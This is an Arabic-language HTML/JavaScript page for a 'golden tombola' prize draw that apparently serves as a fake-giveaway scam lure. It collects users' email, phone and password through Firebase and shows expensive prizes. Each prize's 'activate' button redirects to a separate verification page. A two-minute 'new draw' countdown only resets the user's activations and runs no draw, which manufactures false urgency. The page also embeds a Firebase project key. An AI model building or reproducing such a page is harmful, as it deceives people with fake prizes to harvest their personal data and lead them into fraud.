<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طومبولا الحظ | النسخة الذهبية</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold-light: #fde68a; --gold: #fbbf24; --gold-dark: #b45309; --primary: #1e293b; }
        body { font-family: 'Cairo', sans-serif; background: #ffffff; color: var(--primary); overflow-x: hidden; margin: 0; }
        .bg-animate { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%); z-index: -1; }
        .glass { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border: 2px solid var(--gold); border-radius: 24px; box-shadow: 0 10px 25px -5px rgba(180, 83, 9, 0.1); }
        .page { display: none; min-height: 100vh; opacity: 0; transition: opacity 0.4s ease; }
        .page.active { display: flex; flex-direction: column; opacity: 1; }
        .golden-ticket { background: linear-gradient(135deg, #b45309 0%, #fbbf24 50%, #fde68a 100%); padding: 2px; border-radius: 20px; position: relative; box-shadow: 0 10px 20px -5px rgba(180, 83, 9, 0.3); }
        .ticket-inner { background: white; border-radius: 18px; padding: 15px 25px; display: flex; align-items: center; justify-content: space-between; position: relative; overflow: hidden; }
        .ticket-inner::before, .ticket-inner::after { content: ''; position: absolute; width: 30px; height: 30px; background: #f8fafc; border-radius: 50%; top: 50%; transform: translateY(-50%); border: 2px solid var(--gold); }
        .ticket-inner::before { left: -20px; } .ticket-inner::after { right: -20px; }
        .countdown-timer { background: linear-gradient(90deg, #1e293b 0%, #334155 100%); color: white; border-radius: 15px; padding: 15px; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .timer-val { font-size: 24px; font-weight: 900; color: var(--gold); line-height: 1; }
        .timer-label { font-size: 10px; color: #94a3b8; font-weight: bold; }
        .prizes-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; padding: 10px; }
        .btn-activate { background: #fff; border: 3px dashed var(--gold); transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); width: 100%; aspect-ratio: 3/4; display: flex; flex-direction: column; align-items: center; justify-content: center; border-radius: 28px; cursor: pointer; padding: 10px; }
        .btn-activate:hover { border-style: solid; background: #fffbeb; transform: translateY(-8px); box-shadow: 0 20px 25px -5px rgba(251, 191, 36, 0.3); }
        .prize-card { border-radius: 28px; overflow: hidden; background: white; width: 100%; aspect-ratio: 3/4; animation: fadeIn 0.5s ease-out; box-shadow: 0 15px 30px -10px rgba(180, 83, 9, 0.2); display: flex; flex-direction: column; border: 3px solid var(--gold); }
        .prize-img { flex: 1; width: 100%; height: 60%; object-fit: contain; padding: 15px; background: white; }
        .prize-info { background: linear-gradient(to bottom, var(--gold), var(--gold-dark)); color: white; padding: 12px; text-align: center; flex-shrink: 0; }
        #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); padding: 14px 28px; border-radius: 16px; background: var(--primary); color: white; font-size: 14px; z-index: 200; display: none; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.2); }
        .ticker-container { width: 100%; background: #fffbeb; border: 2px solid var(--gold); overflow: hidden; white-space: nowrap; padding: 12px 0; margin-bottom: 15px; border-radius: 20px; position: relative; }
        .ticker-wrapper { display: inline-block; animation: ticker 350s linear infinite; padding-right: 150px; }
        .ticker-item { display: inline-block; padding: 0 40px; font-size: 14px; color: var(--gold-dark); font-weight: bold; }
        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(100%); } }
        .ticket-badge { background: #fef3c7; border: 1px solid #fbbf24; color: #b45309; padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 800; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.8; } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.8; } }
    </style>
</head>
<body>
    <div class="bg-animate"></div>
    <div id="toast"></div>

    <div id="loginPage" class="page active items-center justify-center p-4">
        <div class="max-w-md w-full glass p-8 text-center">
            <div class="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center text-4xl mx-auto mb-6 border-2 border-amber-400">🎁</div>
            <h1 class="text-4xl font-black mb-2 text-amber-600">طومبولا الحظ</h1>
            <p class="text-slate-500 mb-8 text-sm">سجل دخولك للمشاركة في السحب الذهبي</p>
            <div class="space-y-4 text-right">
                <input type="email" id="emailInput" placeholder="البريد الإلكتروني" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
                <input type="tel" id="phoneInput" placeholder="رقم الهاتف (مثال: 06XXXXXXXX)" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
                <input type="password" id="passwordInput" placeholder="كلمة المرور" class="w-full p-4 rounded-2xl border-2 border-slate-100 outline-none focus:border-amber-400 transition" dir="ltr">
                <button id="authBtn" class="w-full bg-amber-500 hover:bg-amber-600 text-white font-black py-4 rounded-2xl mt-4 shadow-lg transition-all active:scale-95">دخول / تسجيل</button>
            </div>
        </div>
    </div>

    <div id="dashboardPage" class="page p-4 md:p-10">
        <div class="max-w-6xl mx-auto w-full">
            <div class="golden-ticket mb-10">
                <div class="ticket-inner">
                    <div class="flex-1">
                        <h2 class="text-xl md:text-2xl font-black text-slate-800">الجوائز الذهبية المتاحة</h2>
                        <p id="userPhoneDisplay" class="text-amber-600 font-black text-sm mt-1">المشارك: --</p>
                        <div id="activeTicketsContainer" class="flex flex-wrap gap-2 mt-3"></div>
                    </div>
                    <div class="text-center px-4 border-r-2 border-dashed border-amber-200">
                        <span class="text-[10px] font-bold text-slate-400 uppercase">ID</span>
                        <div class="text-lg font-black text-amber-600" id="mainTicketID">#LUCKY</div>
                    </div>
                </div>
            </div>

            <div class="ticker-container shadow-md"><div class="ticker-wrapper" id="tickerWrapper"></div></div>

            <div class="countdown-timer">
                <span class="text-xs font-black text-amber-400">سحب جديد خلال:</span>
                <div class="flex gap-4">
                    <div class="timer-unit text-center"><span class="timer-val" id="mn">02</span><br><span class="timer-label">دقيقة</span></div>
                    <div class="timer-unit text-center"><span class="timer-val" id="sc">00</span><br><span class="timer-label">ثانية</span></div>
                </div>
            </div>
            
            <div class="prizes-grid" id="prizesGrid"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
        import { getFirestore, doc, onSnapshot, setDoc, getDoc, serverTimestamp, writeBatch } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCYipCdnHZXCkO3qKN9AqaWM9IDf9rOv04",
            authDomain: "soug-62f2f.firebaseapp.com",
            projectId: "soug-62f2f",
            storageBucket: "soug-62f2f.firebasestorage.app",
            messagingSenderId: "672944475308",
            appId: "1:672944475308:web:c8158bdf2c5613f51c2309"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "tombola-luck-v1";

        const prizeData = {
            1: { name: "Samsung Galaxy A24", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/%D9%87%D8%A7%D8%AA%D9%81-Samsung-Galaxy-A24.jpg?raw=true" },
            2: { name: "Smart Watch Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/aac8ea81-cdea-499f-8668-21507e131368.jpg?raw=true" },
            3: { name: "Airpods Pro 2", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/ca9ed7f7-e22c-407a-933c-b351bb8bf665.jpg?raw=true" },
            4: { name: "PlayStation 5 Slim", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/d64385f1-7120-42b5-8d23-06b38b980b24.jpg?raw=true" },
            5: { name: "Gaming Mouse RGB", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/b3fbe8f8-09ee-4669-9bef-cc051f9a68da.jpg?raw=true" },
            6: { name: "Condor Refrigerator", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/60441268-4fe8-4751-b6eb-66bea972ea97.jpg?raw=true" },
            7: { name: "Laptop Sleeve", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/656c9ef8-d45e-4cd8-a745-54a34faa6be4.jpg?raw=true" },
            8: { name: "Amazon Gift Card $50", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/99a3c8f6-f38f-4b43-9970-adfa06c9533d.jpg?raw=true" },
            9: { name: "iPhone 15 Pro", img: "https://github.com/danibakou-prog/PAYRIXW/blob/main/5310e3d5-4f07-4495-8221-a60aee958a66.jpg?raw=true" },
            10: { name: "iPad Air M2", img: "https://m.media-amazon.com/images/I/61T0pX9O67L._AC_SL1500_.jpg" }
        };

        // --- التوجيه لصفحة التحقق ---
        window.startActivation = (uid, index) => {
            const prize = prizeData[index];
            window.location.href = `verify.html?uid=${uid}&index=${index}&prizeName=${encodeURIComponent(prize.name)}`;
        };

        // إدارة الحالة والصفحات
        onAuthStateChanged(auth, async (user) => {
            if (user) {
                const snap = await getDoc(doc(db, 'artifacts', appId, 'users', user.uid, 'profile', 'info'));
                let phone = localStorage.getItem('user_phone') || "Unknown";
                if (snap.exists()) phone = snap.data().phone;
                document.getElementById('userPhoneDisplay').innerText = "المشارك المحظوظ: " + phone;
                document.getElementById('mainTicketID').innerText = "#" + phone.slice(-5);
                showPage('dashboardPage');
                renderGrid(user.uid);
                startDrawCountdown(user.uid);
            } else {
                showPage('loginPage');
            }
        });

        document.getElementById('authBtn').onclick = async () => {
            const email = document.getElementById('emailInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const phone = document.getElementById('phoneInput').value.trim();
            if(!email || !pass || !phone) return showMessage("أكمل البيانات أولاً");
            try { 
                await signInWithEmailAndPassword(auth, email, pass);
                localStorage.setItem('user_phone', phone);
            } catch {
                try {
                    const res = await createUserWithEmailAndPassword(auth, email, pass);
                    await setDoc(doc(db, 'artifacts', appId, 'users', res.user.uid, 'profile', 'info'), { phone, email, createdAt: serverTimestamp() });
                    localStorage.setItem('user_phone', phone);
                } catch (e) { showMessage("خطأ: " + e.message); }
            }
        };

        function renderGrid(uid) {
            const grid = document.getElementById('prizesGrid');
            grid.innerHTML = '';
            for(let i=1; i<=10; i++){
                const cont = document.createElement('div');
                cont.id = `prize-container-${i}`;
                grid.appendChild(cont);
                onSnapshot(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), (snap) => {
                    const active = snap.exists() && snap.data().active;
                    const prize = prizeData[i];
                    if(active){
                        cont.innerHTML = `<div class="prize-card"><img src="${prize.img}" class="prize-img"><div class="prize-info"><h4 class="font-bold text-[12px] mb-1">${prize.name}</h4><div class="bg-white/20 py-1 rounded-lg font-mono text-[10px]">${snap.data().ticketNumber}</div><p class="text-[9px] mt-2 font-bold">تذكرة نشطة ✅</p></div></div>`;
                    } else {
                        cont.innerHTML = `<div class="btn-activate" onclick="startActivation('${uid}', ${i})"><div class="bg-amber-50 w-20 h-20 rounded-full flex items-center justify-center mb-2"><img src="${prize.img}" class="w-14 h-14 object-contain"></div><span class="font-black text-[12px] text-center">${prize.name}</span><span class="text-[10px] text-amber-600 font-bold mt-1">تفعيل الآن</span></div>`;
                    }
                });
            }
        }

        function startDrawCountdown(uid) {
            let sec = 120;
            setInterval(() => {
                sec--;
                if(sec <= 0) { sec = 120; resetCards(uid); }
                document.getElementById('mn').innerText = Math.floor(sec/60).toString().padStart(2,'0');
                document.getElementById('sc').innerText = (sec%60).toString().padStart(2,'0');
            }, 1000);
        }

        async function resetCards(uid) {
            const batch = writeBatch(db);
            for(let i=1; i<=10; i++) batch.set(doc(db, 'artifacts', appId, 'users', uid, 'activatedCards', `card_${i}`), { active: false }, { merge: true });
            await batch.commit();
        }

        function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); document.getElementById(id).style.display = (id==='loginPage'?'flex':'block'); }
        function showMessage(m) { const t = document.getElementById('toast'); t.innerText = m; t.style.display = 'block'; setTimeout(()=>t.style.display='none', 3000); }
    </script>
</body>
</html>
